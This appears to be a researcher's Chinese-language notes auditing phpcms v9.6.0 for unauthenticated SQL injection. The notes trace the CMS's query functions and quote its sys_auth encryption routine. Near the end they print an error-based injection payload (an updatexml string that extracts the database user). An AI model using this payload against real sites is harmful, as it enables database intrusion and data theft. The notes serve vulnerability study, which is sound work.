# phpcms v9.6.0 sql inject

phpcms 采用mvc

数据库查询函数有

- get_one

- select

- query

这样三种

那么挖掘sql注入最终总是要经过这几个函数的，那么我们去寻找这几个函数所在的位置

先减小难度，通常前台sql的危险系数大，所以着重找前台的sql

那么mvc架构下

(phpcmsv9 文档)[http://v9.help.phpcms.cn/html/2010/structure_0928/71.html]

![图示](/home/r7/screenshots/2017-04-21_5x732.png)

那么我们搜索的点肯定集中在phpcms_dir/phpcms/modules/*

grep 提取文件名

`grep -rn "select(" * | cut -d":" -f 1`

`cat admin| sort |uniq |sort > admin_u`

`comm -23 select_u admin_u | grep -v -E "tpl.php$|class.php$|func.php|inc.php"`

筛选条件，所有具有extends admin的文件均不可直接由未登录用户直接使用这个接口

排除后还剩下

# list

select 

apps/phpcms/phpcms/modules/comment/uninstall/model.php
apps/phpcms/phpcms/modules/content/down.php
apps/phpcms/phpcms/modules/content/index.php
apps/phpcms/phpcms/modules/content/rss.php
apps/phpcms/phpcms/modules/content/search.php
apps/phpcms/phpcms/modules/formguide/index.php
apps/phpcms/phpcms/modules/member/content.php
apps/phpcms/phpcms/modules/message/index.php
apps/phpcms/phpcms/modules/poster/index.php
apps/phpcms/phpcms/modules/search/index.php
apps/phpcms/phpcms/modules/special/index.php
apps/phpcms/phpcms/modules/vote/index.php
apps/phpcms/phpcms/modules/wap/index.php

get_one

apps/phpcms/phpcms/modules/announce/index.php
apps/phpcms/phpcms/modules/comment/index.php
apps/phpcms/phpcms/modules/content/down.php
apps/phpcms/phpcms/modules/content/index.php
apps/phpcms/phpcms/modules/content/tag.php
apps/phpcms/phpcms/modules/dbsource/call.php
apps/phpcms/phpcms/modules/formguide/index.php
apps/phpcms/phpcms/modules/member/content.php
apps/phpcms/phpcms/modules/member/index.php
apps/phpcms/phpcms/modules/message/index.php
apps/phpcms/phpcms/modules/mood/index.php
apps/phpcms/phpcms/modules/pay/respond.php
apps/phpcms/phpcms/modules/poster/index.php
apps/phpcms/phpcms/modules/search/index.php
apps/phpcms/phpcms/modules/special/index.php
apps/phpcms/phpcms/modules/video/video_for_ck.php
apps/phpcms/phpcms/modules/vote/index.php
apps/phpcms/phpcms/modules/wap/index.php

query
apps/phpcms/phpcms/modules/comment/uninstall/model.php
apps/phpcms/phpcms/modules/content/fields/add.sql.php
apps/phpcms/phpcms/modules/content/fields/delete.sql.php
apps/phpcms/phpcms/modules/content/fields/edit.sql.php
apps/phpcms/phpcms/modules/content/search.php
apps/phpcms/phpcms/modules/dbsource/call.php
apps/phpcms/phpcms/modules/formguide/fields/add.sql.php
apps/phpcms/phpcms/modules/formguide/fields/delete.sql.php
apps/phpcms/phpcms/modules/formguide/fields/edit.sql.php
apps/phpcms/phpcms/modules/member/fields/add.sql.php
apps/phpcms/phpcms/modules/member/fields/delete.sql.php
apps/phpcms/phpcms/modules/member/fields/edit.sql.php

以第一个为例子

apps/phpcms/phpcms/modules/comment/uninstall/model.php

```php
<?php
defined('IN_PHPCMS') or exit('Access Denied');
defined('UNINSTALL') or exit('Access Denied'); 
$comment_table_db = pc_base::load_model('comment_table_model');
$tablelist = $comment_table_db->select('', 'tableid');
	foreach($tablelist as $k=>$v) {
		$comment_table_db->query("DROP TABLE IF EXISTS `".$comment_table_db->db_tablepre."comment_data_".$v['tableid']."`;");
	}
return array('comment', 'comment_check', 'comment_setting', 'comment_table');
?>
```
$comment_table_db 是 pc_base::load_model('commnet_table_model') 来的

phpcms/model/comment_table_model.class.php

class comment_table_model extends model

继承于model

class model所在的文件是phpcms/libs/classes/model.class.php

关键点是在构造函数中

$this->db = db_factory::get_instance($this->db_config)->get_database($this->db_setting);

![](/home/r7/Pictures/Screenshot from 2017-04-23 09-52-28.png)

可以看到默认的数据库连接方式是`mysqli`,

然后就返回了数据库连接，再接由封装好的函数进行数据操作

下面是一些基本的基础函数的跟踪

phpcms/modules/comment/uninstall/model.php

`pc_base::load_model('comment_table_model')`

phpstorm

find symbol -> `ctrl+shift+alt+N`

查找symbol

phpcms/base.php

```
public static function load_model($classname) {
    return self::_load_class($classname,'model');
}

private static function _load_class($classname, $path = '', $initialize = 1) {
    static $classes = array();
    if (empty($path)) $path = 'libs'.DIRECTORY_SEPARATOR.'classes';

    $key = md5($path.$classname);
    if (isset($classes[$key])) {
        if (!empty($classes[$key])) {
            return $classes[$key];
        } else {
            return true;
        }
    }
    if (file_exists(PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.'.class.php')) {
        include PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.'.class.php';
        $name = $classname;
        if ($my_path = self::my_path(PC_PATH.$path.DIRECTORY_SEPARATOR.$classname.'.class.php')) {
            include $my_path;
            $name = 'MY_'.$classname;
        }
        if ($initialize) {
            $classes[$key] = new $name;
        } else {
            $classes[$key] = true;
        }
        return $classes[$key];
    } else {
        return false;
    }
}

```
如上函数执行`load_model`加载某类函数类文件

默认path = libs/classes

如果`libs/classes/$classname.class.php`文件存在就包含该文件

phpcms/libs/classes/model.class.php

```
final public function select($where = '', $data = '*', $limit = '', $order = '', $group = '', $key='') {
    if (is_array($where)) $where = $this->sqls($where);
    return $this->db->select($data, $this->table_name, $where, $limit, $order, $group, $key);
}
```
这便是封装好的select 也就是

$tablelist = $comment_table_db->select('', 'tableid');

用到的select

但是注意到，这个select是表层的select，它调用的是$this->db->select

这个是在phpcms/libs/classes/model.class.php

构造函数中

$this->db = db_factory::get_instance($this->db_config)->get_database($this->db_setting);

由上面写到的默认为mysqli的初始连接

phpcms/libs/classes/db_factory.class.php

这个是get_database函数所在的文件，由命名空间也可以看出

get_database中的连接有该文件connect函数返回，但是注意到connect函数中mysqli部分由如下语句加载

$object = pc_base::load_sys_class('db_mysqli');

采用上面提到的操作定位到

```php
public static function load_sys_class($classname, $path = '', $initialize = 1) {
        return self::_load_class($classname, $path, $initialize);
}
```
_load_class我们上面已经看到，作用也很清楚

那么接下来跳转到文件

phpcms/libs/classes/db_mysqli.class.php

```php
public function select($data, $table, $where = '', $limit = '', $order = '', $group = '', $key = '') {
    $where = $where == '' ? '' : ' WHERE '.$where;
    $order = $order == '' ? '' : ' ORDER BY '.$order;
    $group = $group == '' ? '' : ' GROUP BY '.$group;
    $limit = $limit == '' ? '' : ' LIMIT '.$limit;
    $field = explode(',', $data);
    array_walk($field, array($this, 'add_special_char'));
    $data = implode(',', $field);

    $sql = 'SELECT '.$data.' FROM `'.$this->config['database'].'`.`'.$table.'`'.$where.$group.$order.$limit;
    $this->execute($sql);
    if(!is_object($this->lastqueryid)) {
        return $this->lastqueryid;
    }

    $datalist = array();
    while(($rs = $this->fetch_next()) != false) {
        if($key) {
            $datalist[$rs[$key]] = $rs;
        } else {
            $datalist[] = $rs;
        }
    }
    $this->free_result();
    return $datalist;
}
```

可以看到，这个位置的$sql变量就是sql语句直接交给execute函数，并由execute中的$this->link->query直接执行，那么这个$this->link是什么？在初始化connect函数中

$this->link = new mysqli()

就是这样然后我们溯源到最上层

phpcms/modules/comment/uninstall/model.php

没有条件可以由我们控制传入的参数，同理用于该文件下面的query函数，这里就重复如上步骤即可得证

理清了，这几个连接函数，和查询函数，那么直接寻在在上述文件列表中的函数中，是否有直接可以控制的参数并带入查询的

下面逐一排查


00000000007a8da55608327a41{"aid":1,"src":"&id=%27 and updatexml(1,concat(0x7e,(user())),1)#&m=1&f=wobushou&modelid=2&catid=6","filename":""}

{"aid":1,"src":"&id=%27 and updatexml(1,concat(0x7e,(user())),1)#&m=1&f=wobushou&modelid=2&catid=6","filename":""}

function sys_auth($string, $operation = 'ENCODE', $key = '', $expiry = 0) {
	$ckey_length = 4;
	$key = md5($key != '' ? $key : pc_base::load_config('system', 'auth_key'));
	$keya = md5(substr($key, 0, 16));
	$keyb = md5(substr($key, 16, 16));
	$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';

	$cryptkey = $keya.md5($keya.$keyc);
	$key_length = strlen($cryptkey);

	$string = $operation == 'DECODE' ? base64_decode(strtr(substr($string, $ckey_length), '-_', '+/')) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
	$string_length = strlen($string);

	$result = '';
	$box = range(0, 255);

	$rndkey = array();
	for($i = 0; $i <= 255; $i++) {
		$rndkey[$i] = ord($cryptkey[$i % $key_length]);
	}

	for($j = $i = 0; $i < 256; $i++) {
		$j = ($j + $box[$i] + $rndkey[$i]) % 256;
		$tmp = $box[$i];
		$box[$i] = $box[$j];
		$box[$j] = $tmp;
	}

	for($a = $j = $i = 0; $i < $string_length; $i++) {
		$a = ($a + 1) % 256;
		$j = ($j + $box[$a]) % 256;
		$tmp = $box[$a];
		$box[$a] = $box[$j];
		$box[$j] = $tmp;
		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
	}

	if($operation == 'DECODE') {
		if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
			return substr($result, 26);
		} else {
			return '';
		}
	} else {
		return $keyc.rtrim(strtr(base64_encode($result), '+/', '-_'), '=');
	}
}

这是最关键的函数，它的具体运算我暂时不进行深入分析，我们只需要找一个可以利用的encode的点就很接近成功了，
